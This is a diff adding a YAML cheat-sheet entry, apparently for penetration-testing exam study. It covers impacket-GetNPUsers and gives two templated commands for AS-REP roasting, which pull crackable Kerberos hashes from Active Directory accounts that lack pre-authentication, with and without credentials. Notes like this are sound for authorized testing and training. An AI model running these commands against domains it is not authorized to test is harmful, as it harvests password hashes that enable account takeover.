@@ -1,0 +1,14 @@
+tool: impacket-GetNPUsers
+tags: [auth, kerberos, ad, m13]
+exam_hint: "AS-REP roasting — find users without Kerberos pre-auth enabled"
+docs:
+  - https://github.com/fortra/impacket
+
+actions:
+  - title: as-rep roast no creds
+    desc: Request AS-REP hashes for users without preauth (if policy allows)
+    command: "impacket-GetNPUsers {{domain}}/ -usersfile users.txt -no-pass -dc-ip {{ip}}"
+
+  - title: as-rep roast with creds
+    desc: Enumerate roastable accounts using valid domain credentials
+    command: "impacket-GetNPUsers {{domain}}/{{user}}:{{pass}} -dc-ip {{ip}} -request"
